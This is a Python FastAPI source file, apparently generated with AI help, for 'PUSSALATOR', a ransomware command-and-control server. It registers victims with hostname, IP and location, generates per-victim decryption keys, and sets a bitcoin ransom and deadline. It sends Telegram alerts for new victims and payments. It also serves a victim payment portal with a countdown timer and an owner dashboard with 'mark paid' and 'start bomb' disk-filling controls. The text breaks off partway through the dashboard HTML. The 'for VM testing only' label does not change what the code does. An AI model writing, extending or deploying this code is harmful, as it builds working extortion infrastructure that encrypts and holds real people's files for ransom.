import os
import json
import random
import string
import hashlib
import hmac
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List
from contextlib import asynccontextmanager

# FastAPI imports
from fastapi import FastAPI, Request, Response, HTTPException, Depends, Cookie, status
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import uvicorn

# Third party imports
from supabase import create_client, Client
import requests
from pydantic import BaseModel
from jose import JWTError, jwt

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY',)
    
    # Supabase credentials
    SUPABASE_URL = os.environ.get('SUPABASE_URL')
    SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY')
    SUPABASE_JWT_SECRET = os.environ.get('SUPABASE_JWT_SECRET')  # From Supabase Settings > Auth
    
    # Ransom settings
    DEFAULT_RANSOM_AMOUNT = os.environ.get('DEFAULT_RANSOM_AMOUNT', '0.5 BTC')
    DEFAULT_BTC_ADDRESS = os.environ.get('DEFAULT_BTC_ADDRESS')
    DEFAULT_DEADLINE_HOURS = int(os.environ.get('DEFAULT_DEADLINE_HOURS', 72))
    
    # Owner credentials for Supabase Auth
    OWNER_EMAIL = os.environ.get('OWNER_EMAIL')
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')

    # Telegram Bot
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
    
    # Server settings
    DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
    HOST = '0.0.0.0'
    PORT = int(os.environ.get('PORT', 8000))

# ============================================================================
# SUPABASE CLIENTS
# ============================================================================

# Public client (for regular operations)
supabase: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)

# Admin client (for privileged operations)
supabase_admin: Client = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)

# ============================================================================
# JWT BEARER AUTHENTICATION [citation:4]
# ============================================================================

class JWTBearer(HTTPBearer):
    def __init__(self, auto_error: bool = True):
        super(JWTBearer, self).__init__(auto_error=auto_error)

    async def __call__(self, request: Request):
        credentials: HTTPAuthorizationCredentials = await super(JWTBearer, self).__call__(request)
        if credentials:
            if not credentials.scheme == "Bearer":
                raise HTTPException(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Invalid authentication scheme."
                )
            if not self.verify_jwt(credentials.credentials):
                raise HTTPException(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail="Invalid token or expired token."
                )
            return credentials.credentials
        else:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Invalid authorization code."
            )

    def verify_jwt(self, jwtoken: str) -> bool:
        try:
            # Verify JWT with Supabase secret [citation:4]
            payload = jwt.decode(
                jwtoken,
                Config.SUPABASE_JWT_SECRET,
                algorithms=["HS256"],
                audience="authenticated"
            )
            return True
        except JWTError:
            return False

# Dependency to get current user from JWT [citation:1]
async def get_current_user(credentials: str = Depends(JWTBearer())):
    try:
        # Decode token to get user info
        payload = jwt.decode(
            credentials,
            Config.SUPABASE_JWT_SECRET,
            algorithms=["HS256"],
            audience="authenticated"
        )
        return {
            "id": payload.get("sub"),
            "email": payload.get("email"),
            "role": payload.get("role", "authenticated")
        }
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Invalid authentication credentials"
        )

# ============================================================================
# PYDANTIC MODELS
# ============================================================================

class VictimRegister(BaseModel):
    victim_id: Optional[str] = None
    hostname: Optional[str] = "Unknown"
    ip: Optional[str] = "0.0.0.0"
    country: Optional[str] = "Unknown"
    country_code: Optional[str] = "XX"
    city: Optional[str] = "Unknown"
    lat: Optional[float] = 0.0
    lon: Optional[float] = 0.0
    isp: Optional[str] = "Unknown"
    os: Optional[str] = "Unknown"
    files: Optional[int] = 0

class VictimUpdate(BaseModel):
    victim_id: str
    files_encrypted: Optional[int] = None

class PaymentVerify(BaseModel):
    victim_id: str
    tx_id: Optional[str] = "manual_verification"

class BombUpdate(BaseModel):
    client_id: str
    size_gb: Optional[float] = 0
    error: Optional[str] = None

class OwnerLogin(BaseModel):
    email: str
    password: str

class OwnerLoginResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"

class BombControl(BaseModel):
    victim_id: str
    filename: Optional[str] = "explosion.dat"

# ============================================================================
# TELEGRAM BOT [citation:5]
# ============================================================================

class TelegramBot:
    """Telegram bot for notifications"""
    
    def __init__(self):
        self.token = Config.TELEGRAM_BOT_TOKEN
        self.chat_id = Config.TELEGRAM_CHAT_ID
        self.enabled = bool(self.token and self.chat_id)
        
        if self.enabled:
            # Test the connection
            test_msg = self.send("🔴 PUSSALATOR BACKEND STARTED", silent=True)
            if test_msg:
                print(f"[+] Telegram bot enabled - chat ID: {self.chat_id}")
            else:
                print("[-] Telegram bot configured but not working")
                self.enabled = False
        else:
            print("[-] Telegram bot disabled - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
    
    def send(self, message: str, silent: bool = False) -> bool:
        """Send message to Telegram"""
        if not self.enabled:
            return False
        
        try:
            response = requests.post(
                f"https://api.telegram.org/bot{self.token}/sendMessage",
                json={
                    'chat_id': self.chat_id,
                    'text': f"<b>🔴 PUSSALATOR</b>\n\n{message}\n\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                    'parse_mode': 'HTML',
                    'disable_notification': silent
                },
                timeout=5
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[-] Telegram error: {e}")
            return False
    
    def notify_new_victim(self, victim_id: str, location: str, ip: str, hostname: str):
        if not self.enabled:
            return
        self.send(f"""🔥 <b>NEW VICTIM</b>

<b>ID:</b> <code>{victim_id}</code>
<b>Hostname:</b> {hostname}
<b>Location:</b> {location}
<b>IP:</b> {ip}""")
    
    def notify_payment(self, victim_id: str, amount: str, tx_id: str):
        if not self.enabled:
            return
        self.send(f"""💰 <b>PAYMENT RECEIVED</b>

<b>ID:</b> <code>{victim_id}</code>
<b>Amount:</b> {amount}
<b>Transaction:</b> <code>{tx_id}</code>""")
    
    def notify_bomb_start(self, victim_id: str):
        if not self.enabled:
            return
        self.send(f"""💣 <b>DISK BOMB ACTIVATED</b>

<b>ID:</b> <code>{victim_id}</code>""")
    
    def notify_bomb_stop(self, victim_id: str):
        if not self.enabled:
            return
        self.send(f"""⛓️ <b>BOMB STOPPED</b>

<b>ID:</b> <code>{victim_id}</code>""")

# Initialize Telegram bot
telegram = TelegramBot()

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def generate_victim_id() -> str:
    """Generate random victim ID"""
    chars = string.ascii_uppercase + string.digits
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_part = ''.join(random.choices(chars, k=8))
    return f"VIC-{timestamp}-{random_part}"

def generate_encryption_key() -> str:
    """Generate encryption key"""
    from cryptography.fernet import Fernet
    return Fernet.generate_key().decode()

def get_stats() -> Dict[str, Any]:
    """Get system statistics from Supabase"""
    try:
        # Total victims
        total = supabase_admin.table('victims').select('*', count='exact').execute()
        
        # By status
        paid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'paid').execute()
        unpaid = supabase_admin.table('victims').select('*', count='exact').eq('status', 'unpaid').execute()
        expired = supabase_admin.table('victims').select('*', count='exact').eq('status', 'expired').execute()
        
        # Total files
        files_result = supabase_admin.table('victims').select('files').execute()
        total_files = sum(v.get('files', 0) for v in files_result.data)
        
        # Active bombs
        active_bombs = supabase_admin.table('victims').select('*', count='exact').eq('bomb_status', 'active').execute()
        
        # Paid today
        today = datetime.now().date().isoformat()
        paid_today = supabase_admin.table('victims').select('*', count='exact')\
            .eq('status', 'paid')\
            .gte('paid_at', f"{today}T00:00:00")\
            .lte('paid_at', f"{today}T23:59:59")\
            .execute()
        
        return {
            'total': len(total.data),
            'paid': len(paid.data),
            'unpaid': len(unpaid.data),
            'expired': len(expired.data),
            'total_files': total_files,
            'active_bombs': len(active_bombs.data),
            'paid_today': len(paid_today.data)
        }
    except Exception as e:
        print(f"Stats error: {e}")
        return {
            'total': 0, 'paid': 0, 'unpaid': 0, 'expired': 0,
            'total_files': 0, 'active_bombs': 0, 'paid_today': 0
        }

# ============================================================================
# FASTAPI APP INIT
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    print("=" * 60)
    print("PUSSALATOR - SUPABASE BACKEND")
    print("=" * 60)
    print(f"Supabase URL: {Config.SUPABASE_URL}")
    print(f"Owner Email: {Config.OWNER_EMAIL}")
    print(f"Telegram: {'✅ ENABLED' if telegram.enabled else '❌ DISABLED'}")
    print("=" * 60)
    print("WARNING: For VM testing only!")
    print("=" * 60)
    
    # Create owner user if not exists [citation:1]
    try:
        # Check if owner exists
        owner = supabase_admin.auth.admin.get_user_by_email(Config.OWNER_EMAIL)
        if not owner:
            # Create owner user
            supabase_admin.auth.admin.create_user({
                'email': Config.OWNER_EMAIL,
                'password': Config.OWNER_PASSWORD,
                'email_confirm': True
            })
            print(f"[+] Owner user created: {Config.OWNER_EMAIL}")
    except Exception as e:
        print(f"[-] Owner user may already exist: {e}")
    
    yield
    
    print("[+] Shutting down...")

app = FastAPI(
    title="PUSSALATOR",
    description="For VM testing only",
    version="1.0",
    lifespan=lifespan
)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================================
# HTML TEMPLATES
# ============================================================================

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            background: #000000;
            color: #33ff33;
            font-family: 'Courier New', 'Terminal', monospace;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23000000"/><path d="M10 10 L90 10 M10 20 L90 20 M10 30 L90 30 M10 40 L90 40 M10 50 L90 50 M10 60 L90 60 M10 70 L90 70 M10 80 L90 80 M10 90 L90 90 M10 10 L10 90 M20 10 L20 90 M30 10 L30 90 M40 10 L40 90 M50 10 L50 90 M60 10 L60 90 M70 10 L70 90 M80 10 L80 90 M90 10 L90 90" stroke="%231a1a1a" stroke-width="0.5" fill="none"/></svg>');
        }
        .container {
            max-width: 600px;
            width: 100%;
            margin: 20px auto;
            border: 3px solid #ff0000;
            padding: 20px;
            background: #0a0a0a;
            box-shadow: 10px 10px 0 #660000;
            position: relative;
        }
        .container:before {
            content: "";
            position: absolute;
            top: 5px;
            left: 5px;
            right: -5px;
            bottom: -5px;
            background: #330000;
            z-index: -1;
        }
        h1 {
            font-size: 48px;
            color: #ff0000;
            margin: 10px 0;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 4px;
            text-shadow: 3px 3px 0 #660000, 5px 5px 0 #330000;
            font-family: 'Courier New', monospace;
        }
        @media (max-width: 480px) { 
            h1 { font-size: 36px; } 
        }
        .subtitle {
            color: #ff6666;
            margin-bottom: 25px;
            font-size: 16px;
            border-top: 1px solid #ff0000;
            border-bottom: 1px solid #ff0000;
            padding: 10px 0;
            text-transform: uppercase;
            font-weight: bold;
            background: #1a0000;
        }
        .ascii {
            color: #ff0000;
            font-size: 12px;
            line-height: 1.2;
            white-space: pre;
            margin: 15px 0;
            overflow-x: auto;
            background: #000000;
            padding: 10px;
            border: 1px solid #330000;
        }
        .input-group { 
            margin: 30px 0; 
            background: #1a0000;
            padding: 20px;
            border: 1px solid #330000;
        }
        .input-field {
            background: #000000;
            border: 2px solid #ff0000;
            color: #33ff33;
            padding: 12px 15px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            width: 100%;
            max-width: 300px;
            margin: 10px auto;
            display: block;
            text-align: center;
        }
        .input-field:focus {
            outline: none;
            border-color: #ff6666;
            background: #0a0a0a;
        }
        .button {
            background: #cc0000;
            color: #000000;
            border: 2px solid #ff0000;
            padding: 12px 30px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .button:hover {
            background: #ff0000;
            border-color: #ffffff;
        }
        .stats {
            color: #ff9999;
            margin-top: 25px;
            font-size: 12px;
            padding: 15px;
            background: #0a0000;
            border: 2px solid #330000;
            font-family: 'Courier New', monospace;
        }
        .message {
            color: #ff6666;
            margin-top: 15px;
            min-height: 25px;
            font-size: 14px;
            font-weight: bold;
        }
        .footer {
            margin-top: 20px;
            font-size: 9px;
            color: #330000;
            border-top: 1px solid #330000;
            padding-top: 10px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        .stat-item {
            background: #1a0000;
            padding: 8px;
            border: 1px solid #330000;
        }
        .stat-label {
            font-size: 10px;
            color: #cc6666;
            text-transform: uppercase;
        }
        .stat-number {
            font-size: 24px;
            color: #ff0000;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }
        .blink {
            animation: blink 2s step-end infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ascii">
    ,     ,                   
    |\\---/|                   
   /  , ,  \                  
  =||  =  ||=                 
    ||___||                   
    /     \                   
   (_______)
        </div>
        
        <h1>PUSSALATOR</h1>
        <div class="subtitle">>> ENTER ACCESS ID <<</div>
        
        <div class="input-group">
            <input type="text" id="access_id" class="input-field" placeholder="_" autocomplete="off" onkeypress="handleKey(event)">
            <button class="button" onclick="submitId()">>> SUBMIT <<</button>
        </div>
        
        <div id="message" class="message"></div>
        
        <div class="stats" id="stats">
            <span class="blink">></span> Loading system data...
        </div>
        
        <div class="footer">
            SYSTEM v1.0 | FOR VM TESTING ONLY | 2000
        </div>
    </div>

    <script>
        var OWNER_EMAIL = 'owner@pussalator.com';
        
        function handleKey(e) {
            if (e.key === 'Enter') {
                submitId();
            }
        }
        
        function submitId() {
            var id = document.getElementById('access_id').value.trim();
            var messageDiv = document.getElementById('message');
            
            if (!id) {
                messageDiv.innerHTML = '> ERROR: Please enter an ID';
                return;
            }
            
            fetch('/api/victim/' + id)
                .then(function(response) {
                    if (response.status === 200) {
                        window.location.href = '/victim/' + id;
                    } else {
                        messageDiv.innerHTML = '> ERROR: Invalid ID';
                        document.getElementById('access_id').value = '';
                    }
                })
                .catch(function() {
                    messageDiv.innerHTML = '> ERROR: Connection failed';
                });
        }
        
        function loadStats() {
            fetch('/api/stats')
                .then(function(response) { return response.json(); })
                .then(function(stats) {
                    document.getElementById('stats').innerHTML = '' +
                        '<div class="stats-grid">' +
                        '<div class="stat-item">' +
                        '<div class="stat-label">TOTAL</div>' +
                        '<div class="stat-number">' + stats.total + '</div>' +
                        '</div>' +
                        '<div class="stat-item">' +
                        '<div class="stat-label">PAID</div>' +
                        '<div class="stat-number">' + stats.paid + '</div>' +
                        '</div>' +
                        '<div class="stat-item">' +
                        '<div class="stat-label">ACTIVE</div>' +
                        '<div class="stat-number">' + (stats.active_bombs || 0) + '</div>' +
                        '</div>' +
                        '</div>' +
                        '<div style="margin-top: 10px; font-size: 10px;">' +
                        'FILES ENCRYPTED: ' + (stats.total_files || 0).toLocaleString() +
                        '</div>';
                })
                .catch(function() {
                    document.getElementById('stats').innerHTML = '> SYSTEM DATA UNAVAILABLE';
                });
        }
        
        loadStats();
        setInterval(loadStats, 10000);
    </script>
</body>
</html>
"""

VICTIM_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - VICTIM ACCESS</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body {
            background: #000000;
            color: #33ff33;
            font-family: 'Courier New', 'Terminal', monospace;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 50 50"><rect width="50" height="50" fill="%23000000"/><circle cx="25" cy="25" r="1" fill="%231a0000"/></svg>');
        }
        .container {
            max-width: 700px;
            width: 100%;
            margin: 20px auto;
            border: 3px solid #ff0000;
            padding: 20px;
            background: #0a0a0a;
            box-shadow: 10px 10px 0 #660000;
            position: relative;
        }
        .container:before {
            content: "VICTIM";
            position: absolute;
            top: -10px;
            left: 20px;
            background: #000000;
            color: #ff0000;
            padding: 0 10px;
            font-size: 12px;
            font-weight: bold;
        }
        h1 {
            color: #ff0000;
            text-align: center;
            font-size: 32px;
            margin: 5px 0 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 2px solid #330000;
            padding-bottom: 10px;
        }
        @media (max-width: 480px) { h1 { font-size: 24px; } }
        .info-box {
            background: #0a0000;
            border: 2px solid #330000;
            padding: 15px;
            margin: 15px 0;
            font-size: 14px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px dotted #330000;
        }
        .info-label {
            color: #cc6666;
            font-weight: bold;
            text-transform: uppercase;
        }
        .info-value {
            color: #33ff33;
            word-break: break-word;
            text-align: right;
            font-family: 'Courier New', monospace;
        }
        .key-box {
            background: #001100;
            border: 2px solid #33ff33;
            padding: 20px;
            margin: 20px 0;
            word-break: break-all;
            font-family: monospace;
            font-size: 14px;
            color: #33ff33;
        }
        .status-box {
            text-align: center;
            padding: 20px;
            margin: 15px 0;
            font-size: 28px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 4px;
        }
        .status-paid {
            background: #001100;
            color: #33ff33;
            border: 3px solid #33ff33;
        }
        .status-unpaid {
            background: #221100;
            color: #ffaa00;
            border: 3px solid #ffaa00;
        }
        .status-expired {
            background: #220000;
            color: #ff6666;
            border: 3px solid #ff6666;
        }
        .timer {
            font-size: 48px;
            text-align: center;
            color: #ff0000;
            margin: 20px 0;
            padding: 20px;
            background: #1a0000;
            border: 2px solid #ff0000;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }
        @media (max-width: 480px) { .timer { font-size: 36px; } }
        .button {
            background: #cc0000;
            color: #000000;
            border: 2px solid #ff0000;
            padding: 10px 20px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin: 10px 5px;
            text-transform: uppercase;
        }
        .button:hover {
            background: #ff0000;
        }
        .button-small { padding: 5px 10px; font-size: 11px; }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #ff6666;
            text-decoration: none;
            font-size: 14px;
            padding: 8px 15px;
            border: 2px solid #ff6666;
            text-transform: uppercase;
        }
        .back-link:hover {
            background: #ff0000;
            color: #000000;
            border-color: #ff0000;
        }
        .btc-address {
            background: #111111;
            padding: 15px;
            font-family: monospace;
            font-size: 14px;
            color: #ffaa00;
            word-break: break-all;
            border: 2px solid #ffaa00;
            margin: 10px 0;
        }
        .warning {
            color: #ff0000;
            text-align: center;
            font-size: 12px;
            margin-top: 10px;
            border: 1px solid #ff0000;
            padding: 5px;
            background: #1a0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1> >> VICTIM PORTAL << </h1>
        <div id="content" style="min-height: 200px;">> LOADING...</div>
        <div style="text-align: center;">
            <a href="/" class="back-link"><< BACK TO LOGIN >></a>
        </div>
        <div class="warning">ALL FILES ENCRYPTED. DO NOT ATTEMPT TO DECRYPT.</div>
    </div>

    <script>
        var VICTIM_ID = '{{ victim_id }}';
        
        function loadStatus() {
            fetch('/api/victim/' + VICTIM_ID)
                .then(function(response) {
                    if (!response.ok) throw new Error('Not found');
                    return response.json();
                })
                .then(function(v) {
                    var html = '<div class="info-box">';
                    html += '' +
                        '<div class="info-row"><span class="info-label">VICTIM ID:</span><span class="info-value">' + v.id + '</span></div>' +
                        '<div class="info-row"><span class="info-label">HOSTNAME:</span><span class="info-value">' + (v.hostname || 'UNKNOWN') + '</span></div>' +
                        '<div class="info-row"><span class="info-label">IP ADDRESS:</span><span class="info-value">' + (v.ip || '0.0.0.0') + '</span></div>' +
                        '<div class="info-row"><span class="info-label">LOCATION:</span><span class="info-value">' + (v.city || 'UNKNOWN') + ', ' + (v.country || 'UNKNOWN') + '</span></div>' +
                        '<div class="info-row"><span class="info-label">FILES ENCRYPTED:</span><span class="info-value">' + (v.files || 0).toLocaleString() + '</span></div>' +
                        '<div class="info-row" style="margin-top:10px;border-top:2px solid #ff0000;padding-top:10px;">' +
                        '<span class="info-label">RANSOM:</span><span class="info-value" style="color:#ffaa00;">' + (v.ransom || '0.5 BTC') + '</span></div>' +
                        '<div class="info-row">' +
                        '<span class="info-label">BTC ADDRESS:</span><span class="info-value" style="font-size:11px;">' + (v.wallet || '1PussWalletVMTest') + '</span></div>' +
                    '</div>';
                    
                    if (v.status === 'paid') {
                        html += '<div class="status-box status-paid">>> PAID <<</div>';
                        if (v.key) {
                            html += '<div class="key-box"><strong>DECRYPTION KEY:</strong><br><br>' + v.key + '</div>';
                            html += '<div style="text-align:center;"><button class="button button-small" onclick="copyKey(\'' + v.key + '\')">[ COPY KEY ]</button></div>';
                        }
                    } else if (v.status === 'expired') {
                        html += '<div class="status-box status-expired">>> EXPIRED <<</div>';
                    } else {
                        html += '<div class="status-box status-unpaid">>> UNPAID <<</div>';
                        html += '<div class="btc-address" id="btcAddress">' + (v.wallet || '1PussWalletVMTest') + '</div>';
                        html += '<div style="text-align:center;"><button class="button button-small" onclick="copyBtc()">[ COPY BTC ]</button></div>';
                        html += '<div class="timer" id="timer">--:--:--</div>';
                    }
                    
                    document.getElementById('content').innerHTML = html;
                    
                    if (v.status === 'unpaid' && v.deadline) updateTimer(v.deadline);
                })
                .catch(function() {
                    document.getElementById('content').innerHTML = '<div style="color:#ff0000;padding:40px;text-align:center;">> ERROR: DATA CORRUPTED <</div>';
                });
        }
        
        function updateTimer(deadlineStr) {
            var deadline = new Date(deadlineStr).getTime();
            function tick() {
                var diff = deadline - new Date().getTime();
                if (diff <= 0) {
                    document.getElementById('timer').innerHTML = '>> EXPIRED <<';
                    setTimeout(function() { location.reload(); }, 2000);
                    return;
                }
                var h = Math.floor(diff/(1000*60*60));
                var m = Math.floor((diff%(1000*60*60))/(1000*60));
                var s = Math.floor((diff%(1000*60))/1000);
                document.getElementById('timer').innerHTML = 
                    (h < 10 ? '0' + h : h) + ':' + 
                    (m < 10 ? '0' + m : m) + ':' + 
                    (s < 10 ? '0' + s : s);
            }
            tick();
            setInterval(tick, 1000);
        }
        
        function copyKey(k) { 
            navigator.clipboard.writeText(k).then(function() { alert('KEY COPIED'); }); 
        }
        function copyBtc() { 
            navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(function() { alert('BTC ADDRESS COPIED'); }); 
        }
        
        loadStatus();
        setInterval(loadStatus, 30000);
    </script>
</body>
</html>
"""

OWNER_DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>PUSSALATOR - OWNER CONTROL</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #000000;
            color: #33ff33;
            font-family: 'Courier New', 'Terminal', monospace;
            margin: 0;
            padding: 0;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><rect width="40" height="40" fill="%23000000"/><path d="M0 0 L40 40 M40 0 L0 40" stroke="%231a0000" stroke-width="0.5"/></svg>');
        }
        .navbar {
            background: #1a0000;
            padding: 15px;
            border-bottom: 3px solid #ff0000;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border-top: 1px solid #330000;
        }
        .navbar h1 {
            color: #ff0000;
            margin: 0;
            font-size: 28px;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 2px 2px 0 #330000;
        }
        .nav-links button {
            background: #330000;
            color: #ff6666;
            border: 2px solid #ff0000;
            padding: 8px 15px;
            margin-left: 10px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-transform: uppercase;
        }
        .nav-links button:hover {
            background: #ff0000;
            color: #000000;
        }
        .login-form {
            background: #1a0000;
            border: 3px solid #ff0000;
            padding: 30px;
            max-width: 400px;
            margin: 100px auto;
            text-align: center;
            box-shadow: 10px 10px 0 #330000;
        }
        .login-form h2 {
            color: #ff0000;
            margin-top: 0;
        }
        .login-form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #000000;
            border: 2px solid #ff0000;
            color: #33ff33;
            font-family: 'Courier New', monospace;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
            padding: 0 15px;
        }
        .stat-card {
            background: #1a0000;
            border: 2px solid #ff0000;
            padding: 15px;
            text-align: center;
            box-shadow: 5px 5px 0 #330000;
        }
        .stat-value {
            font-size: 32px;
            color: #ff0000;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }
        .table-container {
            overflow-x: auto;
            background: #1a0000;
            border: 2px solid #ff0000;
            margin: 0 15px;
            box-shadow: 5px 5px 0 #330000;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 800px;
        }
        th {
            background: #330000;
            color: #ff0000;
            padding: 12px;
            text-align: left;
            border-bottom: 2px solid #ff0000;
            text-transform: uppercase;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #330000;
            color: #33ff33;
        }
        .status-paid { color: #33ff33; }
        .status-unpaid { color: #ffaa00; }
        .status-expired { color: #ff6666; }
        .bomb-active {
            color: #ff0000;
            font-weight: bold;
            animation: blink 1s step-end infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .action-btn {
            background: #220000;
            color: #ff6666;
            border: 1px solid #ff0000;
            padding: 4px 8px;
            margin: 2px;
            cursor: pointer;
            font-size: 11px;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
        }
        .action-btn:hover {
            background: #ff0000;
            color: #000000;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal.show { display: flex; }
        .modal-content {
            background: #1a0000;
            border: 3px solid #ff0000;
            padding: 25px;
            max-width: 600px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 10px 10px 0 #330000;
        }
        .close {
            color: #ff6666;
            font-size: 28px;
            cursor: pointer;
            float: right;
        }
        .close:hover {
            color: #ff0000;
        }
        .telegram-status {
            background: #0a0000;
            border: 2px solid #ff0000;
            padding: 10px;
            margin: 15px;
            font-size: 12px;
        }
        .telegram-enabled { color: #33ff33; }
        .telegram-disabled { color: #ff0000; }
        .error { color: #ff0000; margin: 10px 0; }
        .section-title {
            color: #ff0000;
            margin-left: 15px;
            text-transform: uppercase;
            border-left: 4px solid #ff0000;
            padding-left: 10px;
        }
    </style>
</head>
<body>
    <div id="loginView" style="display: block;">
        <div class="login-form">
            <h2>OWNER LOGIN</h2>
            <input type="email" id="email" placeholder="EMAIL" value="owner@pussalator.com">
            <input type="password" id="password" placeholder="PASSWORD">
            <button class="action-btn" onclick="login()" style="width:100%; padding:10px;">>> LOGIN <<</button>
            <div id="loginError" class="error"></div>
        </div>
    </div>
    
    <div id="dashboardView" style="display: none;">
        <div class="navbar">
            <h1>OWNER CONTROL</h1>
            <div class="nav-links">
                <button onclick="loadData()">[ REFRESH ]</button>
                <button onclick="testTelegram()">[ TEST TELEGRAM ]</button>
                <button onclick="logout()">[ LOGOUT ]</button>
            </div>
        </div>
        
        <div class="telegram-status" id="telegramStatus">
            > LOADING TELEGRAM STATUS...
        </div>
        
        <h3 class="section-title">SYSTEM STATISTICS</h3>
        <div class="stats-grid" id="statsGrid">
            <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div>TOTAL</div></div>
            <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div>PAID</div></div>
            <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div>UNPAID</div></div>
            <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div>EXPIRED</div></div>
            <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div>FILES</div></div>
            <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div>BOMBS</div></div>
        </div>
        
        <h3 class="section-title">ACTIVE VICTIMS</h3>
        <div class="table-container">
            <table id="victimsTable">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>HOSTNAME</th>
                        <th>IP</th>
                        <th>FILES</th>
                        <th>STATUS</th>
                        <th>BOMB</th>
                        <th>ACTIONS</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr><td colspan="7" style="text-align:center;padding:40px;">> LOADING VICTIMS...</td></tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <div class="modal" id="victimModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 style="color:#ff0000;">VICTIM DETAILS</h2>
                <span class="close" onclick="closeModal()">X</span>
            </div>
            <div id="victimDetails"></div>
            <div style="margin-top:20px; text-align:center;">
                <button class="action-btn" onclick="markPaid()">MARK PAID</button>
                <button class="action-btn" onclick="startBomb()">START BOMB</button>
